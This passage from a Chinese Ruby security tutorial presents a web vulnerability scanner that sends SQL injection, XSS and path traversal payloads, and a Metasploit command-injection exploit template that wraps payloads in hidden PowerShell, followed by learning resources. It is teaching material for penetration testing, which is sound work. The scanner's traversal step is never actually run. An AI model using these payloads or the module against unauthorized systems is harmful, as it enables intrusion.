---

## 四、高级实战案例

### 4.1 Web 漏洞扫描器

使用 Ruby 构建轻量级 Web 安全扫描器。

```ruby
#!/usr/bin/env ruby
# frozen_string_literal: true

require 'net/http'
require 'net/https'
require 'uri'
require 'json'
require 'thread'
require 'nokogiri'
require 'openssl'

# ===== 漏洞信息 =====
Vulnerability = Struct.new(:name, :severity, :url, :param, :description, :evidence) do
  def to_s
    "[#{severity.upcase}] #{name} - #{url}"
  end
end

# ===== Web 扫描器 =====
class WebScanner
  attr_reader :vulnerabilities, :discovered_urls
  
  def initialize(base_url, options = {})
    @base_url = base_url.end_with?('/') ? base_url.chomp('/') : base_url
    @options = {
      threads: 10,
      timeout: 10,
      depth: 3,
      user_agent: 'Mozilla/5.0 (compatible; RubyScanner/1.0)',
      follow_redirects: false
    }.merge(options)
    
    @vulnerabilities = []
    @discovered_urls = Set.new
    @visited_urls = Set.new
    @mutex = Mutex.new
    @queue = Queue.new
  end
  
  # ===== 发送 HTTP 请求 =====
  def http_request(method, path, params = nil)
    uri = URI.parse("#{@base_url}#{path}")
    uri.query = URI.encode_www_form(params) if params && method == :get
    
    http = Net::HTTP.new(uri.host, uri.port)
    http.use_ssl = uri.scheme == 'https'
    http.verify_mode = OpenSSL::SSL::VERIFY_NONE
    http.read_timeout = @options[:timeout]
    http.open_timeout = @options[:timeout]
    
    request = case method
              when :get then Net::HTTP::Get.new(uri.request_uri)
              when :post then Net::HTTP::Post.new(uri.request_uri)
              else Net::HTTP::Get.new(uri.request_uri)
              end
    
    request['User-Agent'] = @options[:user_agent]
    request['Cookie'] = @options[:cookies] if @options[:cookies]
    
    if method == :post && params
      request.set_form_data(params)
    end
    
    begin
      response = http.request(request)
      [response, response.body]
    rescue StandardError => e
      [nil, e.message]
    end
  end
  
  # ===== 爬取链接 =====
  def crawl(start_path = '/', max_depth = nil)
    max_depth ||= @options[:depth]
    @queue << [start_path, 0]
    @discovered_urls.add(start_path)
    
    threads = []
    @options[:threads].times do
      threads << Thread.new do
        loop do
          break if @queue.empty? && @queue.num_waiting == @options[:threads] - 1
          
          begin
            path, depth = @queue.pop(true)
          rescue ThreadError
            sleep 0.1
            next
          end
          
          next if @visited_urls.include?(path)
          next if depth > max_depth
          
          @mutex.synchronize { @visited_urls.add(path) }
          
          response, body = http_request(:get, path)
          next unless response && body
          
          puts "[Crawl] #{path} (#{response.code})"
          
          # 提取链接
          extract_links(body, path).each do |new_path|
            @mutex.synchronize do
              unless @discovered_urls.include?(new_path)
                @discovered_urls.add(new_path)
                @queue << [new_path, depth + 1]
              end
            end
          end
        end
      end
    end
    
    threads.each(&:join)
    @discovered_urls.to_a
  end
  
  # ===== 从 HTML 提取链接 =====
  def extract_links(html, current_path)
    return [] unless html
    
    doc = Nokogiri::HTML(html)
    links = []
    
    # a 标签
    doc.css('a[href]').each do |link|
      href = link['href']
      next unless href
      
      path = normalize_path(href, current_path)
      links << path if path && same_origin?(path)
    end
    
    # form 表单 action
    doc.css('form[action]').each do |form|
      action = form['action']
      path = normalize_path(action, current_path)
      links << path if path && same_origin?(path)
    end
    
    links.uniq
  end
  
  def normalize_path(href, current_path)
    return nil if href.nil? || href.empty?
    return nil if href.start_with?('javascript:', 'mailto:', '#', 'tel:')
    
    uri = URI.parse(href)
    if uri.absolute?
      return nil unless same_origin?(href)
      uri.path + (uri.query ? "?#{uri.query}" : '')
    else
      # 相对路径转绝对
      base = File.dirname(current_path)
      base = '/' if base == '.'
      full = File.expand_path(href, base)
      full.gsub(%r{/\.\.?(?:/|$)}, '/')
    end
  rescue URI::InvalidURIError
    nil
  end
  
  def same_origin?(url)
    return true unless url.start_with?('http')
    base_uri = URI.parse(@base_url)
    target_uri = URI.parse(url)
    base_uri.host == target_uri.host && base_uri.port == target_uri.port
  rescue URI::InvalidURIError
    false
  end
  
  # ===== SQL 注入检测 =====
  def check_sqli(path, param)
    payloads = [
      "'",
      "' OR '1'='1",
      "' UNION SELECT NULL,NULL,NULL--",
      "1' AND SLEEP(2)--"
    ]
    
    error_signatures = [
      /MySQL syntax error/i,
      /SQL syntax/i,
      /ORA-\d+/i,
      /PostgreSQL/i,
      /Microsoft SQL Server/i,
      /Warning.*mysql_/i,
      /unclosed quotation mark/i,
      /Syntax error.*string/i
    ]
    
    payloads.each do |payload|
      response, body = http_request(:get, path, { param => payload })
      next unless body
      
      error_signatures.each do |sig|
        if body.match?(sig)
          vuln = Vulnerability.new(
            'SQL Injection',
            'critical',
            path,
            param,
            "参数 #{param} 可能存在 SQL 注入",
            sig.source
          )
          @mutex.synchronize { @vulnerabilities << vuln }
          return true
        end
      end
    end
    false
  end
  
  # ===== XSS 检测 =====
  def check_xss(path, param)
    payloads = [
      "<script>alert('xss')</script>",
      "\"><script>alert('xss')</script>",
      "'><script>alert('xss')</script>",
      "<img src=x onerror=alert('xss')>",
      "javascript:alert('xss')"
    ]
    
    payloads.each do |payload|
      response, body = http_request(:get, path, { param => payload })
      next unless body
      
      # 检查 payload 是否在响应中原样出现
      if body.include?(payload)
        vuln = Vulnerability.new(
          'Reflected XSS',
          'high',
          path,
          param,
          "参数 #{param} 存在反射型 XSS",
          payload
        )
        @mutex.synchronize { @vulnerabilities << vuln }
        return true
      end
    end
    false
  end
  
  # ===== 目录遍历检测 =====
  def check_path_traversal(path)
    payloads = [
      '../../../../etc/passwd',
      '..\\..\\..\\..\\windows\\win.ini',
      '%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '....//....//etc/passwd'
    ]
    
    indicators = [
      /root:.*:.*:.*:.*:.*:.*/,  # /etc/passwd 格式
      /\[fonts\]/i,              # win.ini
      /\[extensions\]/i,
      /root:x:0:/i
    ]
    
    payloads.each do |payload|
      response, body = http_request(:get, "#{path}#{payload}")
      next unless body
      
      indicators.each do |indicator|
        if body.match?(indicator)
          vuln = Vulnerability.new(
            'Path Traversal',
            'high',
            path,
            nil,
            '可能存在目录遍历漏洞',
            indicator.source
          )
          @mutex.synchronize { @vulnerabilities << vuln }
          return true
        end
      end
    end
    false
  end
  
  # ===== 安全头检测 =====
  def check_security_headers(path = '/')
    response, _ = http_request(:get, path)
    return unless response
    
    required_headers = {
      'X-Content-Type-Options' => { expected: 'nosniff', severity: 'medium' },
      'X-Frame-Options' => { expected: /DENY|SAMEORIGIN/i, severity: 'medium' },
      'Content-Security-Policy' => { expected: /.+/, severity: 'high' },
      'Strict-Transport-Security' => { expected: /.+/, severity: 'medium' },
      'Referrer-Policy' => { expected: /.+/, severity: 'low' },
      'X-XSS-Protection' => { expected: /1; mode=block/i, severity: 'low' }
    }
    
    required_headers.each do |header, info|
      value = response[header]
      
      unless value
        vuln = Vulnerability.new(
          "Missing Security Header: #{header}",
          info[:severity],
          path,
          nil,
          "缺少安全头 #{header}",
          ''
        )
        @mutex.synchronize { @vulnerabilities << vuln }
        next
      end
      
      if info[:expected].is_a?(Regexp) && !value.match?(info[:expected])
        vuln = Vulnerability.new(
          "Insecure Header: #{header}",
          'low',
          path,
          nil,
          "安全头 #{header} 配置不安全: #{value}",
          value
        )
        @mutex.synchronize { @vulnerabilities << vuln }
      end
    end
  end
  
  # ===== 目录爆破 =====
  def dir_bruteforce(wordlist)
    found = []
    mutex = Mutex.new
    
    threads = @options[:threads].times.map do
      Thread.new do
        while path = @queue.pop(true) rescue nil
          response, _ = http_request(:get, "/#{path}")
          if response && response.code != '404'
            mutex.synchronize { found << "[#{response.code}] /#{path}" }
          end
        end
      end
    end
    
    wordlist.each { |path| @queue << path }
    threads.each(&:join)
    
    found
  end
  
  # ===== 完整扫描 =====
  def full_scan
    puts "[*] 开始扫描: #{@base_url}"
    puts
    
    # 1. 安全头检测
    puts "[1/5] 检测安全头..."
    check_security_headers
    
    # 2. 爬取网站
    puts "[2/5] 爬取网站链接..."
    crawl
    puts "    发现 #{@discovered_urls.size} 个 URL"
    
    # 3. SQL 注入检测
    puts "[3/5] 检测 SQL 注入..."
    @discovered_urls.each do |url|
      uri = URI.parse("#{@base_url}#{url}")
      next unless uri.query
      params = URI.decode_www_form(uri.query).to_h
      params.each_key { |param| check_sqli(url, param) }
    end
    
    # 4. XSS 检测
    puts "[4/5] 检测 XSS..."
    @discovered_urls.each do |url|
      uri = URI.parse("#{@base_url}#{url}")
      next unless uri.query
      params = URI.decode_www_form(uri.query).to_h
      params.each_key { |param| check_xss(url, param) }
    end
    
    # 5. 目录遍历检测
    puts "[5/5] 检测目录遍历..."
    
    puts
    puts "=== 扫描完成 ==="
    puts "发现 #{@vulnerabilities.size} 个潜在漏洞:"
    @vulnerabilities.each { |v| puts "  #{v}" }
  end
end

# ===== 使用示例 =====
if __FILE__ == $0
  scanner = WebScanner.new('http://example.com', threads: 20)
  scanner.full_scan
end
```

### 4.2 Metasploit 模块开发

Ruby 编写自定义 Metasploit 渗透测试模块。

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => '示例：远程命令执行漏洞利用模块',
      'Description'    => %q{
        这是一个示例 Metasploit 模块，演示如何编写
        远程命令执行漏洞的利用模块。
      },
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '202X-XXXXX'],
          ['URL', 'https://example.com/advisory']
        ],
      'Privileged'     => false,
      'Platform'       => %w[linux unix win],
      'Arch'           => ARCH_CMD,
      'Targets'        =>
        [
          ['Unix Command',  { 'Platform' => 'unix',  'Arch' => ARCH_CMD }],
          ['Linux Command', { 'Platform' => 'linux', 'Arch' => ARCH_CMD }],
          ['Windows CMD',   { 'Platform' => 'win',   'Arch' => ARCH_CMD }]
        ],
      'Payload'        =>
        {
          'Space'       => 8192,
          'DisableNops' => true
        },
      'DefaultTarget'  => 0,
      'DisclosureDate' => '202X-01-01'))

    register_options(
      [
        OptString.new('TARGETURI', [true, '目标路径', '/']),
        OptString.new('PARAM', [true, '漏洞参数名', 'cmd']),
        OptString.new('METHOD', [true, '请求方法 (GET/POST)', 'GET'])
      ])
  end

  # ===== 检查目标是否存在漏洞 =====
  def check
    print_status("Checking target...")
    
    # 发送探测请求
    test_cmd = case target['Platform']
               when 'win' then 'echo VULN_TEST & ver'
               else 'echo VULN_TEST; id'
               end
    
    res = execute_command(test_cmd)
    
    unless res
      return CheckCode::Unknown('Connection failed')
    end
    
    if res.body.include?('VULN_TEST')
      return CheckCode::Vulnerable('Command execution confirmed')
    end
    
    CheckCode::Safe
  end

  # ===== 执行命令 =====
  def execute_command(cmd, opts = {})
    uri = normalize_uri(target_uri.path)
    param = datastore['PARAM']
    method = datastore['METHOD'].upcase
    
    if method == 'POST'
      res = send_request_cgi({
        'method' => 'POST',
        'uri'    => uri,
        'vars_post' => {
          param => cmd
        }
      })
    else
      res = send_request_cgi({
        'method' => 'GET',
        'uri'    => uri,
        'vars_get' => {
          param => cmd
        }
      })
    end
    
    res
  end

  # ===== 漏洞利用 =====
  def exploit
    print_status("Sending exploit...")
    
    command = payload.encoded
    
    # Windows 需要编码
    if target['Platform'] == 'win'
      # 使用 PowerShell 下载执行
      command = "powershell -nop -w hidden -c \"#{command}\""
    end
    
    res = execute_command(command)
    
    if res && res.code == 200
      print_good("Command executed successfully")
      print_line(res.body) if res.body && !res.body.empty?
    else
      print_error("Exploit may have failed")
    end
  end
end

=begin
    ===== Metasploit 模块开发指南 =====
    
    模块类型:
    - exploit: 漏洞利用模块
    - auxiliary: 辅助模块（扫描、信息收集）
    - post: 后渗透模块
    - payload: 攻击载荷
    - encoder: 编码器
    - nop: NOP 生成器
    
    常用 mixin:
    - Msf::Exploit::Remote::Tcp - TCP 通信
    - Msf::Exploit::Remote::HttpClient - HTTP 通信
    - Msf::Exploit::Remote::SMB::Client - SMB 通信
    - Msf::Exploit::FileDropper - 文件删除（清理痕迹）
    - Msf::Exploit::Remote::HttpClient - HTTP 客户端
    
    关键方法:
    - initialize: 模块初始化
    - check: 检查目标是否有漏洞 (可选)
    - exploit: 漏洞利用主逻辑
    
    输出函数:
    - print_status - 普通信息
    - print_good - 成功信息
    - print_error - 错误信息
    - print_warning - 警告信息
    - vprint_status - 详细信息 (verbose)
    - print_line - 原始输出
=end
```

---

## 五、进阶学习资源

### 5.1 Ruby 安全资源

- **Ruby 官方安全文档**：https://www.ruby-lang.org/en/security/
- **Ruby 安全最佳实践**：https://guides.rubyonrails.org/security.html
- **OWASP Ruby 安全**：https://cheatsheetseries.owasp.org/cheatsheets/Ruby_on_Rails_Cheat_Sheet.html
- **RubySec**：https://rubysec.com/ — Ruby 安全公告

### 5.2 安全工具与库

- **Web 安全**：
  - Brakeman — Rails 静态分析：https://brakemanscanner.org/
  - bundler-audit — 依赖漏洞检查：https://github.com/rubysec/bundler-audit
  - rack-protection — Rack 安全中间件
  - devise — 用户认证

- **加密库**：
  - OpenSSL — Ruby 加密标准库
  - RbNaCl — 现代加密库
  - bcrypt — 密码哈希
  - rotp — OTP (双因素认证)

- **安全工具**：
  - Metasploit Framework — 渗透测试框架
  - wpscan — WordPress 扫描
  - WhatWeb — Web 技术识别
  - recon-ng — 侦察框架

### 5.3 Metasploit 开发资源

- **Metasploit Unleashed**：https://www.offensive-security.com/metasploit-unleashed/
- **Metasploit 官方文档**：https://docs.metasploit.com/
- **Metasploit GitHub**：https://github.com/rapid7/metasploit-framework
- **Rapid7 博客**：https://www.rapid7.com/blog/

### 5.4 CTF 与练习平台

- **Hack The Box**：https://www.hackthebox.com/
- **TryHackMe**：https://tryhackme.com/
- **VulnHub**：https://www.vulnhub.com/
- **OverTheWire**：https://overthewire.org/wargames/
- **攻防世界**：https://adworld.xctf.org.cn/

### 5.5 推荐书籍

- **Ruby 编程**：
  - 《Ruby 编程》（Programming Ruby）
  - 《Ruby 元编程》
  - 《Eloquent Ruby》
  - 《Ruby on Rails Tutorial》

- **安全与渗透测试**：
  - 《Metasploit 渗透测试指南》
  - 《The Ruby Programming Language》
  - 《Ruby 安全》
  - 《Web 安全深度剖析》

### 5.6 社区与博客

- **Ruby 官方博客**：https://www.ruby-lang.org/en/news/
- **RubySec**：https://rubysec.com/advisories/
- **Rails 安全**：https://weblog.rubyonrails.org/
- **FreeBuf**：https://www.freebuf.com/
- **先知社区**：https://xz.aliyun.com/

### 5.7 进阶学习路线

**第 1 阶段：Ruby 精通（1-2月）**
- Ruby 元编程
- 块、Proc、Lambda
- 模块与混入
- 反射与内省

**第 2 阶段：Rails 安全开发（2-3月）**
- 认证与授权
- SQL 注入防护
- XSS 与 CSRF 防护
- 安全配置

**第 3 阶段：安全工具开发（2-3月）**
- 网络编程
- 爬虫开发
- 漏洞扫描器
- 自动化脚本

**第 4 阶段：Metasploit 开发（2-3月）**
- 模块结构
- exploit 开发
- auxiliary 开发
- post 模块开发

**第 5 阶段：实战与贡献（持续）**
- CTF 比赛
- 漏洞研究
- 工具开发
- 开源贡献
